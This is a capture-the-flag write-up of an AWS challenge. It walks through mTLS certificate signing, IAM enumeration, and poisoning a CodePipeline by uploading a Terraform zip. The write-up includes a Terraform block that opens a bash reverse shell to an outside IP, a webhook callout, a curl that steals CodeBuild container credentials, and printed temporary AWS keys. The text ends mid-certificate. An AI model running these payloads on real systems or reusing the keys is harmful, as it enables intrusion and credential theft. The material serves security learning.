# DevSecMeow
![picture 1](images/99fb08661b79973a49ddb8358c53f15f3d82d990a2b25018c1b007353c9c0514.png)  

This was a really fun challenge where the start and end were both related to MTLS! 

## MTLS
There is a hint to research on [`MTLS`](https://aws.amazon.com/blogs/compute/introducing-mutual-tls-authentication-for-amazon-api-gateway/).

There is also an [AWS API Gateway link](https://61lxjmt991.execute-api.ap-southeast-1.amazonaws.com/development/generate). On each GET HTTP request to the AWS API Gateway, a JSON output will be returned with two pre-signed URLs, `csr` and `crt`.

```json
{"csr": "S3 PUT pre-signed URL to upload client.csr", "crt": "S3 GET pre-signed URL to download client.crt"}
```

After some testing, I discovered that we need to use `PUT` request to upload a `client.csr` (Certificate Signing Request) and then wait for the certificate authority (in this case likely AWS Certificate Manager/Lambda in the backend) to sign it and then we can download it from the `crt` pre-signed URL using a `GET` request.

See the [gen_crt.py](./Challenge%207/gen_crt.py) for a python script that uses these two buckets to upload the `csr` file and then download the `crt` file. In the script a 5 second delay is introduced between the `PUT` and `GET` requests there is sufficient time for the signing to trigger and happen.

We can then use the private key `client.pem` and `client.crt` to request for the AWS creds at https://13.213.29.24/, which will generate AWS credentials (a temporary access key and secret key pair.)

## Enumeration 
Once we are inside the AWS account, we can do some enumeration. I used [IAM-Flaws](https://github.com/nikhil1232/IAM-Flaws) to enumerate through the permissions.

### Policies / Permissions
After using the tool, we have permissions to do quite a few things. The most interesting permissions would be the `codebuild` and `codepipeline` permissions. Since this challenge is about `DevSecMeow`, the target is likely to be in these two areas. 

#### Allowed Permissions

```
codebuild:BatchGetProjects
codebuild:ListProjects
codepipeline:GetPipeline
codepipeline:ListPipelines
events:DescribeRule
events:ListRules
iam:Get*Policy
iam:GetPolicy
iam:GetPolicyVersion
iam:ListAttachedUserPolicies
iam:List*Policies
iam:ListRoles
kms:GetKeyPolicy
kms:ListKeys
s3:PutObject
ssm:DescribeParameters
```

#### Attached Permissions
```
Action:

codepipeline:GetPipeline

Resource:

arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline

----

Action:

s3:PutObject

Resource:

arn:aws:s3:::devsecmeow2023zip/*
```

### CodeBuild
> AWS CodeBuild is a fully managed continuous integration service that compiles source code, runs tests, and produces ready-to-deploy software packages.

Further enumeration on the available projects in `codebuild` showed that there is only one project, `devsecmeow-build`, and this `codebuild` project will use [Terraform](https://www.terraform.io/) templates. The two key commands are `terraform init` and `terraform plan`. Since there is no `terraform apply` command, it indicates that we will not get to spawn resources.

We can also see that the first part of the flag is likely to be in the environment variable of the `codebuild` environment as `$flag1`.

`aws codebuild list-projects`
```json
{
    "projects": [
        "devsecmeow-build"
    ]
}
```
`aws codebuild get-batch-projects --names devsecmeow-build`
```json
{
    "projects": [
        {
            "name": "devsecmeow-build",
            "arn": "arn:aws:codebuild:ap-southeast-1:232705437403:project/devsecmeow-build",
            "source": {
                "type": "CODEPIPELINE",
                "buildspec": "version: 0.2
                                phases:  
                                build:    
                                commands:      
                                    - env      
                                    - cd /usr/bin      
                                    - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip      
                                    - unzip -o terraform.zip      
                                    - cd \"$CODEBUILD_SRC_DIR\"      
                                    - ls -la       
                                    - terraform init       
                                    - terraform plan",
                "insecureSsl": false
            },
            "artifacts": {
                "type": "CODEPIPELINE",
                "name": "devsecmeow-build",
                "packaging": "NONE",
                "overrideArtifactName": false,
                "encryptionDisabled": false
            },
            "cache": {
                "type": "NO_CACHE"
            },
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "flag1",
                        "value": "/devsecmeow/build/password",
                        "type": "PARAMETER_STORE"
                    }
                ],
                "privilegedMode": false,
                "imagePullCredentialsType": "CODEBUILD"
            },
            "serviceRole": "arn:aws:iam::232705437403:role/codebuild-role",
            "timeoutInMinutes": 15,
            "queuedTimeoutInMinutes": 480,
            "encryptionKey": "arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3",
            "tags": [],
            "created": "2023-07-21T11:05:13.010000-04:00",
            "lastModified": "2023-07-21T11:05:13.010000-04:00",
            "badge": {
                "badgeEnabled": false
            },
            "logsConfig": {
                "cloudWatchLogs": {
                    "status": "ENABLED",
                    "groupName": "devsecmeow-codebuild-logs",
                    "streamName": "log-stream"
                },
                "s3Logs": {
                    "status": "DISABLED",
                    "encryptionDisabled": false
                }
            },
            "projectVisibility": "PRIVATE"
        }
    ],
    "projectsNotFound": []
}
```

Now, where does `codebuild` get its terraform templates from?

### CodePipeline
> AWS CodePipeline is a fully managed continuous delivery service that helps you automate your release pipelines for fast and reliable application and infrastructure updates.

Here, we see that the `devsecmeow-build` project is part of a `codepipeline`. From the description of the pipeline, it seems like the Terraform templates will likely be contained within `rawr.zip`.

`aws codepipeline list-pipelines`
```json                           
{
    "pipelines": [
        {
            "name": "devsecmeow-pipeline",
            "version": 1,
            "created": "2023-07-21T11:05:14.065000-04:00",
            "updated": "2023-07-21T11:05:14.065000-04:00"
        }
    ]
}
```

`aws codepipeline get-pipeline --name devsecmeow-pipeline`
```json
{
    "pipeline": {
        "name": "devsecmeow-pipeline",
        "roleArn": "arn:aws:iam::232705437403:role/codepipeline-role",
        "artifactStore": {
            "type": "S3",
            "location": "devsecmeow2023zip"
        },
        "stages": [
            {
                "name": "Source",
                "actions": [
                    {
                        "name": "Source",
                        "actionTypeId": {
                            "category": "Source",
                            "owner": "AWS",
                            "provider": "S3",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "PollForSourceChanges": "false",
                            "S3Bucket": "devsecmeow2023zip",
                            "S3ObjectKey": "rawr.zip"
                        },
                        "outputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ],
                        "inputArtifacts": []
                    }
                ]
            },
            {
                "name": "Build",
                "actions": [
                    {
                        "name": "TerraformPlan",
                        "actionTypeId": {
                            "category": "Build",
                            "owner": "AWS",
                            "provider": "CodeBuild",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {
                            "ProjectName": "devsecmeow-build"
                        },
                        "outputArtifacts": [
                            {
                                "name": "build_output"
                            }
                        ],
                        "inputArtifacts": [
                            {
                                "name": "source_output"
                            }
                        ]
                    }
                ]
            },
            {
                "name": "Approval",
                "actions": [
                    {
                        "name": "Approval",
                        "actionTypeId": {
                            "category": "Approval",
                            "owner": "AWS",
                            "provider": "Manual",
                            "version": "1"
                        },
                        "runOrder": 1,
                        "configuration": {},
                        "outputArtifacts": [],
                        "inputArtifacts": []
                    }
                ]
            }
        ],
        "version": 1
    },
    "metadata": {
        "pipelineArn": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline",
        "created": "2023-07-21T11:05:14.065000-04:00",
        "updated": "2023-07-21T11:05:14.065000-04:00"
    }
}
```
### Events
It looks like there is an event that will trigger the execution of the `codepipeline` and it is through a detection of a file upload into `s3://devsecmeow2023zip` using the `rawr.zip` key.

Coupled with the permission to upload data into the `devsecmeow2023zip` bucket, we likely will zip terraform templates into a zip file, and then upload it into this bucket to trigger the codepipeline execution.

`aws events list-rules`
```json
{
    "Rules": [
        {
            "Name": "cleaner_invocation_rule",
            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/cleaner_invocation_rule",
            "State": "ENABLED",
            "Description": "Scheduled resource cleaning",
            "ScheduleExpression": "rate(15 minutes)",
            "EventBusName": "default"
        },
        {
            "Name": "codepipeline-trigger-rule",
            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/codepipeline-trigger-rule",
            "EventPattern": "{
                    'detail': {
                        'eventName': [
                            'PutObject',
                            'CompleteMultipartUpload',
                            'CopyObject'
                        ],
                        'eventSource': [
                            's3.amazonaws.com'
                        ],
                        'requestParameters': {
                            'bucketName': [
                                'devsecmeow2023zip'
                            ],
                            'key': [
                                'rawr.zip'
                            ]
                        }
                    },
                    'detail-type': [
                        'AWS API Call via CloudTrail'
                    ],
                    'source': [
                        'aws.s3'
                    ]
                }",
            "State": "ENABLED",
            "Description": "Amazon CloudWatch Events rule to automatically start your pipeline when a change occurs in the Amazon S3 object key or S3 folder. Deleting this may prevent changes from being detected in that pipeline. Read more: http://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-about-starting.html",
            "EventBusName": "default"
        }
    ]
}
```

### SSM
> AWS Systems Manager Agent (SSM Agent) is Amazon software that runs on Amazon Elastic Compute Cloud (Amazon EC2) instances, edge devices, on-premises servers, and virtual machines (VMs). 

`aws ssm describe-parameters`
```json
{
    "Parameters": [
        {
            "Name": "/devsecmeow/build/password",
            "Type": "SecureString",
            "KeyId": "6b677475-cc95-4f85-8baa-2f30290cde9d",
            "LastModifiedDate": "2023-07-21T11:05:08.289000-04:00",
            "LastModifiedUser": "arn:aws:iam::232705437403:user/tiscuser",
            "Description": "Password",
            "Version": 1,
            "Tier": "Standard",
            "Policies": [],
            "DataType": "text"
        },
        {
            "Name": "ca_staging_crt",
            "Type": "SecureString",
            "KeyId": "alias/aws/ssm",
            "LastModifiedDate": "2023-07-21T11:05:06.233000-04:00",
            "LastModifiedUser": "arn:aws:iam::232705437403:user/tiscuser",
            "Description": "ca staging crt",
            "Version": 1,
            "Tier": "Standard",
            "Policies": [],
            "DataType": "text"
        },
        {
            "Name": "ca_staging_key",
            "Type": "SecureString",
            "KeyId": "alias/aws/ssm",
            "LastModifiedDate": "2023-07-21T11:05:04.624000-04:00",
            "LastModifiedUser": "arn:aws:iam::232705437403:user/tiscuser",
            "Description": "ca staging key",
            "Version": 1,
            "Tier": "Standard",
            "Policies": [],
            "DataType": "text"
        }
    ]
}
```

## Getting `flag1`
Although `terraform plan` does not deploy resources, it will create an execution plan, which shows the changes that will be made to a deployed infrastructure. I first tested locally if it will fetch external resources like URLs and it worked!

We can use now something like this to get a HTTP request out from the codebuild.
```hcl
data "http" "example" {
  url = "https://webhook.site/ac018f78-2dd1-4be6-b53f-2e1e948b7d64"

  # Optional request headers
  request_headers = {
    Accept = "application/json"
  }
}
```

```bash
zip rawr.zip main.tf
aws s3 cp ./rawr.zip s3://devsecmeow2023zip/rawr.zip
```

![picture 2](images/69115ae67a51a5001db3708593a9d94d47b300af1a009175699cc812624f48dc.png)  

Upon more research I realised that we can also run arbitrary commands from terraform. This means that we can likely get a reverse shell from the `codebuild` environment... Let's get `$flag1`!

I spun up an AWS EC2 instance (on my own account) to get a public ip address (I will learn to use ngrok one day...), and was able to obtain a reverse shell (which means I am inside the `codebuild` environment).

```hcl
data "external" "flag" {
  program = ["bash", "-c", "bash -i >& /dev/tcp/54.179.42.137/443 0>&1"]
}
```

```bash
echo $flag1
>>> TISC{pr0tecT_
```


# Privilege Escalation
At first, I tried to use the `169.254.169.254` IP address to fish for the AWS credentials, but I realised that the IP was unreachable. It seems like in a `codebuild` container the IP address is `169.254.170.2` instead, and there is a [special URL](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc).

`curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
```json
{"RoleArn":"AQICAHiXeu3bIBb9heJmFtHPbcbrxVOOY2z+gbh/ZektV0KIkAFgTje83MGgISxfy/xFDq24AAABATCB/gYJKoZIhvcNAQcGoIHwMIHtAgEAMIHnBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDO9LMmj7W8pMM0ltTgIBEICBuW7VZva93b0IFvybLSvDxVY3y3WgB5F4MXTgmt2lasIDsaNN+x06cNKSYyx9e63ZstpinhyAAeR/M8PVtMNa/1s4nSv5wyEjCKlYfjugpkJ9FZhy6+Q28cHFlyv699ZHdr3IlP4n46gxnqgu01mW4rZBCwl4Cma0TbUAgTfUpsIt1pvMCU9KSUPbPs9zTUG4DnGivXkhd4ExMJ687VVgVfeaUejbukr27ygK79LkmFV8QiisQowxr34b","AccessKeyId":"ASIATMLSTF3NZPMYFO6H","SecretAccessKey":"Dk1Bdrf2sR6wCOF1+Tj/RxuL6OVFSLr5mKZsxvaS","Token":"IQoJb3JpZ2luX2VjEJX//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgcMhiBYWWVHGfOPnMM6DNjdFmkrWoqPWXowJhcnziOG0CIGW/Sklzw8DTt7OL+hX50PBGLQi5IXBjiZeJt/qJEDF0Kr4DCI7//////////wEQABoMMjMyNzA1NDM3NDAzIgxmKi+3UVupmjewJi0qkgMOqBPXTnBfcZa4Ke52Y337RQLXXwik/MHj0RAK528JPLpsMchHbH22fuEkLyXZUETk3DTlKgO4qw9j7TIPHjy+UHMmnld7pT+n7XuKxq1rPwlJRgbjgjm1IY63Hrq5CWCZEBdfPwL3hLN7Ii5LYWJS1DzKVRIDWGv8QGCJOXNa6bR/x+Xrv0XEdnQ6Py3pD1gVWaVVl9uwBy6RN8Pl5/XpJIaOTpbXsXAjc8ioY1xZEdGEcQXwqPEZ0UB4v6RIxWEYMKZQ3/P+1vW4sldW3ey82eJq8Hi+aI56wcLBKiT6NOZotTnjMfZbDfoCexLJGqDaTk9EkmepZWpPhGyKivOQxyvvewpXoUyI/FjvV3uCEEwde9ACtrhkLRtm5QalSxep2cOsxWQ6TBafJmMfqN40JFfCSfZV+v2s4qQDr0cAkqu0UTQYoWSSuGGaTvuq04N8+h8I0nd42i7VoLP6iERk2UjNtaqIyttV2nKyiaBvWkEutkUSfcu9chvD09vW+dHfjf940n9oFc5wlesqdZtBXbkwvM7QqAY6lAE4S/QOvNu9HSLJuR0dAQ/5xbk4BXBp+RSUYOherTW3l0hFpmcoRNp89/EiE+KYlT57tFPMWqpovLAhpO/+l0LtGxihLtoKzoZlvw8ebdqIVmB3pZg0kS7b9kCQjXBl1WH/WLCbZPIeYx9DTrVlx5YkQHN2CbLSh+fBjBXWHBygFANHvE+8RuMc/xiIoOJ/6iRBxoX8","Expiration":"2023-09-27T13:59:40Z"}
```

These are temporary AWS credentials, which means we have to use all 3, `AccessKeyId`, `SecretAccessKey` and `Token`. We can now use these credentials in our own local VM.

```bash
export AWS_ACCESS_KEY_ID="ASIATMLSTF3NZPMYFO6H"
export AWS_SECRET_ACCESS_KEY="Dk1Bdrf2sR6wCOF1+Tj/RxuL6OVFSLr5mKZsxvaS"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEJX//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgcMhiBYWWVHGfOPnMM6DNjdFmkrWoqPWXowJhcnziOG0CIGW/Sklzw8DTt7OL+hX50PBGLQi5IXBjiZeJt/qJEDF0Kr4DCI7//////////wEQABoMMjMyNzA1NDM3NDAzIgxmKi+3UVupmjewJi0qkgMOqBPXTnBfcZa4Ke52Y337RQLXXwik/MHj0RAK528JPLpsMchHbH22fuEkLyXZUETk3DTlKgO4qw9j7TIPHjy+UHMmnld7pT+n7XuKxq1rPwlJRgbjgjm1IY63Hrq5CWCZEBdfPwL3hLN7Ii5LYWJS1DzKVRIDWGv8QGCJOXNa6bR/x+Xrv0XEdnQ6Py3pD1gVWaVVl9uwBy6RN8Pl5/XpJIaOTpbXsXAjc8ioY1xZEdGEcQXwqPEZ0UB4v6RIxWEYMKZQ3/P+1vW4sldW3ey82eJq8Hi+aI56wcLBKiT6NOZotTnjMfZbDfoCexLJGqDaTk9EkmepZWpPhGyKivOQxyvvewpXoUyI/FjvV3uCEEwde9ACtrhkLRtm5QalSxep2cOsxWQ6TBafJmMfqN40JFfCSfZV+v2s4qQDr0cAkqu0UTQYoWSSuGGaTvuq04N8+h8I0nd42i7VoLP6iERk2UjNtaqIyttV2nKyiaBvWkEutkUSfcu9chvD09vW+dHfjf940n9oFc5wlesqdZtBXbkwvM7QqAY6lAE4S/QOvNu9HSLJuR0dAQ/5xbk4BXBp+RSUYOherTW3l0hFpmcoRNp89/EiE+KYlT57tFPMWqpovLAhpO/+l0LtGxihLtoKzoZlvw8ebdqIVmB3pZg0kS7b9kCQjXBl1WH/WLCbZPIeYx9DTrVlx5YkQHN2CbLSh+fBjBXWHBygFANHvE+8RuMc/xiIoOJ/6iRBxoX8"
```

## Enumeration
Here, when I tried to use `IAM-Flaws` to enumerate permissions, I did not get much. It seems like the limitation is that there were no describe policies/permissions permission.

I used another tool [enumerate-iam](https://github.com/andresriancho/enumerate-iam), which will just brute force all the API calls. There were two interesting API calls that we can do: `aws ec2 describe-instances` and `aws kms describe-key`.

### EC2
We can see that there are two servers running, one for development and one for production. Upon visiting the production address `https://54.255.155.134`, we get a 403 forbidden which is the same result is when we try to visit the development address `https://13.213.29.24` without using the signed cert and private key.

This means that we most likely have to get the production CA to sign our csr. 

`aws ec2 describe-instances`

```json
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0df7a207adb9748c7",
                    "InstanceId": "i-02602bf0cf92a4ee1",
                    "InstanceType": "t3a.small",
                    "LaunchTime": "2023-07-31T14:50:12+00:00",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "ap-southeast-1a",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.112",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                    "PublicIpAddress": "54.255.155.134",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2023-07-21T15:05:29+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-059ce4b405612f51a"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20230721150528288200000009",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::232705437403:instance-profile/ec2_production",
                        "Id": "AIPATMLSTF3N6TTIJTATG"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "54.255.155.134"
                            },
                            "Attachment": {
                                "AttachTime": "2023-07-21T15:05:29+00:00",
                                "AttachmentId": "eni-attach-0f142ca01d9f74be8",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "Generic network for staging and production",
                                    "GroupId": "sg-0c178b9e55483a8da"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "02:83:9e:48:11:60",
                            "NetworkInterfaceId": "eni-049d23f49ac0d3c2c",
                            "OwnerId": "232705437403",
                            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.112",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                                        "PublicIp": "54.255.155.134"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                                    "PrivateIpAddress": "192.168.0.112"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                            "VpcId": "vpc-063e577d022d3fa3b",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "SourceDestCheck": true,
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2023-07-21T15:05:29+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios"
                }
            ],
            "OwnerId": "232705437403",
            "ReservationId": "r-076f2078341159d89"
        },
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0df7a207adb9748c7",
                    "InstanceId": "i-02423bae26b4cfd9a",
                    "InstanceType": "t3a.small",
                    "LaunchTime": "2023-09-16T07:06:20+00:00",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "ap-southeast-1a",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.172",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                    "PublicIpAddress": "13.213.29.24",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2023-09-16T07:06:20+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-0429e09162524aa33"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20230916070619552900000001",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "13.213.29.24"
                            },
                            "Attachment": {
                                "AttachTime": "2023-09-16T07:06:20+00:00",
                                "AttachmentId": "eni-attach-01bc5e45e2c2c672f",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupName": "Generic network for staging and production",
                                    "GroupId": "sg-0c178b9e55483a8da"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "02:e5:c1:c3:47:20",
                            "NetworkInterfaceId": "eni-05a6609c4a1cd826d",
                            "OwnerId": "232705437403",
                            "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.172",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-13-213-29-24.ap-southeast-1.compute.amazonaws.com",
                                        "PublicIp": "13.213.29.24"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-192-168-0-172.ap-southeast-1.compute.internal",
                                    "PrivateIpAddress": "192.168.0.172"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                            "VpcId": "vpc-063e577d022d3fa3b",
                            "InterfaceType": "interface"
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "SourceDestCheck": true,
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2023-09-16T07:06:20+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios"
                }
            ],
            "OwnerId": "232705437403",
            "ReservationId": "r-0f7a5b16993d217d9"
        }
    ]
}
```

## Getting user data of EC2 instance
I was stuck for quite a while before thinking about this. I knew that the end was making an `MTLS` request to the production server https://54.255.155.134/. I tried using the original `crt` and `key` but the certificate is invalid (indicating different CA). I got stuck in a rabbit hole trying to find ways to retrieve the `ca_staging_key` and `ca_staging_crt` from the [`ssm`](#ssm) service.

I then moved on to find out if `aws ec2 describe-instances` had more arguments to give more information about the EC2. This led me to the epiphany that I could try to get the user data of production EC2 instance, and it was right! 

The `CodeBuildRole` apparently has the permission to run `describe-instance-attribute`. I was able to get the userData using this command and after base64-decoding it, we can get the CA cert and key (along with the entire bootstrap code).


`aws ec2 describe-instance-attribute --instance-id i-02602bf0cf92a4ee1 --attribute userData
`

```bash
#!/bin/bash
sudo apt update
sudo apt upgrade -y 
sudo apt install nginx -y
sudo apt install awscli -y 
cat <<\EOL > /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	server {
		listen 443 ssl default_server;
		listen [::]:443 ssl default_server;
		ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; 
		ssl_prefer_server_ciphers on;

		ssl_certificate         /etc/nginx/server.crt;
		ssl_certificate_key     /etc/nginx/server.key;
		ssl_client_certificate  /etc/nginx/ca.crt;
		ssl_verify_client       optional;
		ssl_verify_depth        2;
		location / {
				if ($ssl_client_verify != SUCCESS) { return 403; }

				proxy_pass           http://flag_server;
		}

		access_log /var/log/nginx/access.log;
		error_log /var/log/nginx/error.log;
	}
	
	gzip off;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

EOL
cat <<\EOL > /etc/nginx/sites-enabled/default

upstream flag_server {
    server	localhost:3000;
}
server {
	listen 3000;

	root /var/www/html;

	index index.html;

	server_name _;

	location / {
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
		try_files $uri $uri/ =404;
	}

}
EOL
cat <<\EOL > /etc/nginx/server.crt
-----BEGIN CERTIFICATE-----
MIIDxzCCAq8CFF4sQY4xq1aAvfg5YdBJOrxqroG5MA0GCSqGSIb3DQEBCwUAMCAx
HjAcBgNVBAMMFWRldnNlY21lb3ctcHJvZHVjdGlvbjAeFw0yMzA3MjExNDUwNDFa
Fw0yNDA3MjAxNDUwNDFaMCAxHjAcBgNVBAMMFWRldnNlY21lb3cucHJvZHVjdGlv
bjCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMYRqMc1usbS/4yoJ9qW
4QxHwFyHx6b7Mki4vVJD8GoNyGUWfUlksUhq84ZI4ZpAn78tvoV+lzeWQNw4XEz2
X3U3XI7AHFeQYo8WLcvaoAgj0P7uM1kbnoXUx54yraBty98uOKLDwuGD2ZNMyZjR
yE1005eehP/mrtH75N7fN8ZX2GD30/HgDs3wUcdN1N9/CGWF7s6zSMNKKyLbgzd4
UlOIY1jCQN0JyRfRikxfmuKWeElVCz4+iXvC8i69qRL4N63X5TM90jj9KIz1Kqco
gkX+mWaQSAKkGKQI6chYjoVbqQjjF80KO8/3WAFcXwir1C2Y4ZnmK3Y9o5J4Oyln
B5eVRklqsdLyv1KVu2xs1+grKtGet49n/SNMuMwesFmb6tPs3hM8aG0v/0W5eIXb
tBVwu4XwOlITWo1Te/wmP/zai6FYlyLIEpCD6LJ9/sajqxYtaslSHlgIjqTI9VKo
nahEbj8Xa7TMrNFbr2NY5z3oLypICrqE/zPuOgMBM6DX5cnlfqeAwIVnL5QxQoQe
ocwSDeAXDIcNdzHelUCgBiSjLw055hwNsLx/ZQ6Yu7Y4S0hE1CZZ3g++WoH/kLxi
i6pHoaTHsB4NIz5DYiQEydywzjnX7FAXqYwf4iZYLIiS9M6iXXB1OMBgtINVxglA
cBU54+I4u4h/CUkjPYPs8x11AgMBAAEwDQYJKoZIhvcNAQELBQADggEBACoCQZ5e
8a4RgMOoeqiaiKF4xVK8KQGtEUKjIeYT4LIeVFRhpB5m/RWxj2dshHNr1bJWFP+H
